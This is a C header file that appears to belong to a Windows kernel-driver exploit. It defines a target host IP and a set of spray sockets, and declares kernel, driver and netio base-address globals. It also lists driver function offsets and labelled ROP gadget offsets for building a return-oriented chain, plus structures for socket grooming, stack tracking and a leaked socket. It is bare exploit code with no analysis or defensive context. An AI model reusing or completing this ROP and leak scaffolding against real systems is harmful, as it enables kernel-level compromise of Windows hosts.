#pragma comment(lib, "ws2_32.lib")

#ifndef  __INCLUDES_H__
#define __INCLUDES_H__

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <Winsock2.h>

#include <Windows.h>
#include <stdio.h>

#include <vector>

//#include <pe_parse.h>

#define COUNT_SOCKS		10
#define TARGET_HOST     "192.168.227.151" 
#define MODULES_KENREL_INDEX 0

typedef enum _OS_VER_ {
    Win7 = 7601,
    Win8 = 9200,
    Win10 = 10240,
};

extern ULONG glDriverBase;
extern ULONG glKernelBase;
extern ULONG glNetioBase;
extern USHORT glOsVer;

typedef enum _RVA_ {
    rvaToStrQUIT = 0x26B0,
    rva_PR_CloseSocket = 0x157C,
    rva_PR_CloseSocket2 = 0x1580,
    rva_Send = 0x1C00,
    rva_Recv = 0x1F30,
    rva_KernelImpAddr = 0x3014,
    rva_NetioImpAddr = 0x300C,
    // rops
    gad_AddEsp18_PopEdiEsiEbx = 0x2485,
    gad_PopEbp = 0x17A0,
    gad_MovEspEbp = 0x179E,
    gad_ret = 0x17A1,
    gad_retn18 = 0x1A8C,
}RVA;

typedef struct _SOCKETS_ {
    SOCKET mainSock;
    SOCKET targetSock;
    SOCKET tmpSocks[COUNT_SOCKS];
}SOCKETS, * PSOCKETS;

typedef struct _STACKS_ {
    ULONG mainStack;
    ULONG targetStack;
    ULONG diffStacks;
    BOOL isUp;
} STACKS, *PSTACKS;

typedef struct _MEM_WORK_ {
    SOCKETS socks;
    STACKS stacks;
    ULONG leakSock;
} MEM_WORK, *PMEM_WORK;

#endif
